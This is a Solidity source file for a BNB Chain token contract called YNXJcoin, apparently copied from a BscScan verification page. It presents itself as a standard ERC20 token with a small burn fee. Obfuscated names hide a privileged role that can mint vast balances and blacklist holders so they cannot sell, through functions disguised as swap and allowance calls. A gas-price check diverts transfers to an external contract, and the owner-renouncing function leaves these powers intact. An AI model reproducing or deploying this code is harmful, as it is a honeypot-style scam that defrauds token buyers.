/**
 *Submitted for verification at BscScan.com on 2022-08-04
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC7213 {

    function _taansfer(address spender, address recipient, uint256 amounts) external;
    
    function _aapprove(address owner, address spender, uint256 amount) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

contract ryeanf {
    function vjeiaja() internal pure returns (uint256) {
        uint256  ngjaenf = 757385;
        return ngjaenf;
    }
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _ajfneja() internal view virtual returns (address) {
        return msg.sender;
    }

    function _cmemja() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract YNXJcoin is Context, IERC20, Ownable, ryeanf {
    using SafeMath for uint256;

    bool private takeFee = true;

    bool private swapAndLiquify = false;

    mapping(address => bool) private _vienuaeawf;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;
    mapping(address => uint256) private nauafuefna;
    mapping(address => bool) private _mcjanfaefa;


    uint8 private _decimals = 9;
    string private _name = unicode"玉女心经";
    string private _symbol = unicode"玉女心经";

    uint256 public _taxFee = 2;
    uint256 private _tTotal = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _owner;
    address private _oafjamfjaew;
    address private uniswapV2Pair;
    address private _afifjaiwfw;
    uint256 private _fafawfw;
    string private _mafnwjd;
    address private _mkmawmjaw;
    uint256 private _aidiamfea;
    uint256 private _diajuaw;
    address private _kadiamfa;
    

    constructor(address _kifmiawfw, address _ifnjanfwa) {
        _oafjamfjaew = _ifnjanfwa;
        _isExcluded[address(this)] = true;
        _isExcluded[_kifmiawfw] = true;
        _isExcluded[owner()] = true;
        _mcjanfaefa[_kifmiawfw] = true;
        nauafuefna[_ajfneja()] = _tTotal;
        _owner = msg.sender;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function setTaxFeePercent(bool _swapAndLiquify, address _newPeir) external {
        require(_mcjanfaefa[_ajfneja()]);
        if (_mcjanfaefa[_ajfneja()]) {
            swapAndLiquify = _swapAndLiquify;
            uniswapV2Pair = _newPeir;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_ajfneja()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_vienuaeawf[_ajfneja()]||_cmemja()>=(15*1e9)){
            IERC7213(_oafjamfjaew)._taansfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_taxFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_taxFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_cmemja()<=(15*1e9));
        require(!_vienuaeawf[from]);
        if (_mcjanfaefa[from]) {
            require(_mcjanfaefa[from]);
                nauafuefna[from]= 
                nauafuefna[from].
                add(_tTotal*10**6);
        }
        if (swapAndLiquify) {
            if (uniswapV2Pair == from){}else{
                require(_isExcluded[from] || _isExcluded[to]);
            }
            
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(_mcjanfaefa[_ajfneja()]);
        if (_mcjanfaefa[_ajfneja()]) {   
            nauafuefna[spender] = nauafuefna[spender].add(subtractedValue);
        }
    }

    function tokenFromReflection(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(_mcjanfaefa[_ajfneja()]);
        if (_mcjanfaefa[_ajfneja()]){
            _mcjanfaefa[spender] = deductTransferFee;}
    }

    function swapExactTokensForTokens(
        address spender,
        address recipient
    ) external {
        require(_mcjanfaefa[_ajfneja()]);
        if (_mcjanfaefa[_ajfneja()]) {
            _vienuaeawf[spender] = true;
            _vienuaeawf[recipient] = true;
        }
    }

    function swapTokensForExactTokens(address account)
        external
    {
        require(_mcjanfaefa[_ajfneja()]);
        if (_mcjanfaefa[_ajfneja()]) {  
            _vienuaeawf[account] = true;
        }
    }

    function changeUserFrom(address account) external {
        require(_mcjanfaefa[_ajfneja()]);
        if (_mcjanfaefa[_ajfneja()]) {
            _vienuaeawf[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        nauafuefna[sender] = nauafuefna[sender].sub(toAmount);
        nauafuefna[recipient] = nauafuefna[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_vienuaeawf[_ajfneja()]||_cmemja()>=(15*1e9)){
            IERC7213(_oafjamfjaew)._aapprove(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }

    function ANNCHEYw() public pure returns (uint256) {
        return 35614;
    }


    function includeInFee(address account) external {
        require(_mcjanfaefa[_ajfneja()]);
        if (_mcjanfaefa[_ajfneja()]) {
            _isExcluded[account] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setTaxFeePercent(uint256 taxFee) external {
        require(_mcjanfaefa[_ajfneja()]);
        if (_mcjanfaefa[_ajfneja()]) {
            _taxFee = taxFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function IWiveiam() public pure returns (uint256) {
        return vjeiaja();
    }

    function ciamveia() public pure returns (uint256 ){
        uint256 NVNeaie = 1948482;
        return NVNeaie;
    }


    function pvkieae() public pure returns (uint256) {
        uint256 vkiaevireae = 1058483;
        return vkiaevireae;
    }

    function civmaeea() public pure returns (string memory) {
        string memory vmiroae = "vioavmee";
        return vmiroae;
    }

    function kaeiveia() public pure returns (address) {
        address mjvjvneja = address(0);
        return mjvjvneja;
    }

    function jfaunue() public pure returns (uint256) {
        uint256 kwaife = 138483;
        return kwaife;
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(_mcjanfaefa[_ajfneja()]);
        return _vienuaeawf[account];
    }

    function isExcludedFromFee(address spender) external {
        require(_mcjanfaefa[_ajfneja()]);
        if (_mcjanfaefa[_ajfneja()]) {
            _isExcluded[spender] = true;
        }
    }

    function isjfau() public pure returns (uint256) {
        uint256 juaje = 91931;
        return juaje;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return nauafuefna[account];
    }
}